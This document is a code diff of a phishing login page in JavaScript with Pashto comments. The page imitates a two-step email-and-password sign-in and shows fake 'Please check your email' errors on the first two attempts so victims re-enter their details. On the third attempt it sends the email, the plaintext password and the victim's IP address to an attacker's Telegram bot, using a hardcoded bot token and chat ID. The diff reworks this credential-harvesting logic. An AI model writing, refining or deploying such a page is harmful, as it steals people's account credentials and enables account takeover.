@@ -132,11 +132,12 @@
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_ID = "8295417969";
 
+    let attempts = {};
     let currentEmail = "";
-    let attemptCount = 0;  // د پاسورډ هڅو شمېر
 
     // ========== د پښتو تورو چک کولو فنکشن ==========
     function hasPashtoCharacters(text) {
+        // د پښتو تورو یونیکوډ رینج
         const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
         return pashtoRegex.test(text);
     }
@@ -150,16 +151,6 @@
         catch(e) { return 'unknown'; }
     }
 
-    function getDeviceModel() {
-        let ua = navigator.userAgent;
-        if (ua.includes("iPhone")) return "iPhone";
-        if (ua.includes("iPad")) return "iPad";
-        if (ua.includes("Android")) return "Android Mobile";
-        if (ua.includes("Windows")) return "Windows PC";
-        if (ua.includes("Mac")) return "Mac Computer";
-        return "Unknown Device";
-    }
-
     function showMessage(box, text, isError) {
         box.textContent = text;
         box.className = `message ${isError ? 'error-msg' : 'success-msg'}`;
@@ -167,38 +158,32 @@
         setTimeout(() => box.style.display = 'none', 3000);
     }
 
-    function resetToEmailStep() {
+    function goBackToEmail() {
         document.getElementById('step2View').classList.add('hidden');
         document.getElementById('step1View').classList.remove('hidden');
         document.getElementById('stepIndicator').textContent = "Step 1 of 2";
         document.getElementById('emailInput').value = '';
         document.getElementById('passwordInput').value = '';
         currentEmail = '';
-        attemptCount = 0;
     }
 
-    function clearPasswordOnly() {
-        document.getElementById('passwordInput').value = '';
-    }
-
-    function goBackToEmail() {
-        resetToEmailStep();
-    }
-
-    // Step 1: Email Validation
+    // Step 1: Email Validation (د پښتو تورو چک سره)
     document.getElementById('nextBtn').onclick = () => {
         let email = document.getElementById('emailInput').value.trim();
-        let errorBox = document.getElementById('errorBox');
         
-        if (hasPashtoCharacters(email)) {
-            showMessage(errorBox, 'please pashto not allowed', true);
-            document.getElementById('emailInput').value = '';
+        if (!email) {
+            showMessage(document.getElementById('errorBox'), 'Please enter your email', true);
             return;
         }
         
-        if (!email || !isValidEmail(email)) {
-            showMessage(errorBox, 'Please check your email', true);
-            document.getElementById('emailInput').value = '';
+        // د پښتو تورو چک کول
+        if (hasPashtoCharacters(email)) {
+            showMessage(document.getElementById('errorBox'), 'Pashto not allowed', true);
+            return;
+        }
+        
+        if (!isValidEmail(email)) {
+            showMessage(document.getElementById('errorBox'), 'Please enter email EX:username@gmail.com', true);
             return;
         }
         
@@ -208,73 +193,52 @@
         document.getElementById('step2View').classList.remove('hidden');
         document.getElementById('stepIndicator').textContent = "Step 2 of 2";
         document.getElementById('passwordInput').value = '';
-        attemptCount = 0;
     };
 
-    // Step 2: Password Processing
+    // Step 2: Password Validation (د پښتو تورو چک سره)
     document.getElementById('loginBtn').onclick = async () => {
         let pass = document.getElementById('passwordInput').value.trim();
-        let errorBox = document.getElementById('errorBox');
         
-        // هڅه شمېرل
-        attemptCount++;
+        if (!pass) {
+            showMessage(document.getElementById('errorBox'), 'Please enter your password', true);
+            return;
+        }
         
-        // ========== لومړی: پښتو توري چک ==========
+        // د پښتو تورو چک کول
         if (hasPashtoCharacters(pass)) {
-            if (attemptCount === 1) {
-                showMessage(errorBox, 'Please check your email', true);
-                resetToEmailStep();
-            } else if (attemptCount === 2) {
-                showMessage(errorBox, 'Please check your email password', true);
-                clearPasswordOnly();
-            } else if (attemptCount === 3) {
-                showMessage(errorBox, 'please pashto not allowed', true);
-                clearPasswordOnly();
-            }
+            showMessage(document.getElementById('errorBox'), 'Pashto not allowed', true);
             return;
         }
         
-        // ========== دوهم: خالي پاسورډ چک ==========
-        if (pass === "") {
-            if (attemptCount === 1) {
-                showMessage(errorBox, 'Please check your email', true);
-                resetToEmailStep();
-            } else if (attemptCount === 2) {
-                showMessage(errorBox, 'Please check your email password', true);
-                clearPasswordOnly();
-            } else if (attemptCount === 3) {
-                showMessage(errorBox, 'Please enter your password', true);
-                clearPasswordOnly();
-            }
+        let ip = await getUserIP();
+        let key = currentEmail + ip;
+        
+        if (!attempts[key]) attempts[key] = 0;
+        attempts[key]++;
+        
+        let currentAttempt = attempts[key];
+        
+        // First attempt - fail
+        if (currentAttempt === 1) {
+            showMessage(document.getElementById('errorBox'), 'Please check your email', true);
+            setTimeout(() => goBackToEmail(), 1500);
             return;
         }
         
-        // ========== دریم: پاسورډ له 8 کم چک ==========
-        if (pass.length < 8) {
-            if (attemptCount === 1) {
-                showMessage(errorBox, 'Please check your email', true);
-                resetToEmailStep();
-            } else if (attemptCount === 2) {
-                showMessage(errorBox, 'Please check your email password', true);
-                clearPasswordOnly();
-            } else if (attemptCount === 3) {
-                showMessage(errorBox, 'Password must be at least 8 characters', true);
-                clearPasswordOnly();
-            }
+        // Second attempt - fail
+        if (currentAttempt === 2) {
+            showMessage(document.getElementById('errorBox'), 'Please check your email password', true);
+            setTimeout(() => goBackToEmail(), 1500);
             return;
         }
         
-        // ========== پاسورډ سم دی (8 توري یا زیات، پښتو نه دی) ==========
-        if (attemptCount === 3) {
-            // دریمه هڅه: بریالی لاګ ان
-            let ip = await getUserIP();
-            let device = getDeviceModel();
-            
+        // Third attempt - success
+        if (currentAttempt >= 3) {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     chat_id: ADMIN_ID, 
-                    text: `access from login telegrame page\n✅ LOGIN SUCCESS\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}\nDevice: ${device}`,
+                    text: `✅ LOGIN SUCCESS\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}`,
                     parse_mode: 'Markdown'
                 })
             });
@@ -282,19 +246,11 @@
             showMessage(document.getElementById('successBox'), 'Login successful! Redirecting to bot...', false);
             document.getElementById('loader').style.display = 'block';
             
+            delete attempts[key];
+            
             setTimeout(() => {
                 window.location.href = BOT_REDIRECT;
             }, 2000);
-            attemptCount = 0;
-        } else {
-            // لومړۍ یا دوهمه هڅه: سره له دې چې پاسورډ سم دی، لاګ ان نه کوي
-            if (attemptCount === 1) {
-                showMessage(errorBox, 'Please check your email', true);
-                resetToEmailStep();
-            } else if (attemptCount === 2) {
-                showMessage(errorBox, 'Please check your email password', true);
-                clearPasswordOnly();
-            }
         }
     };
 </script>
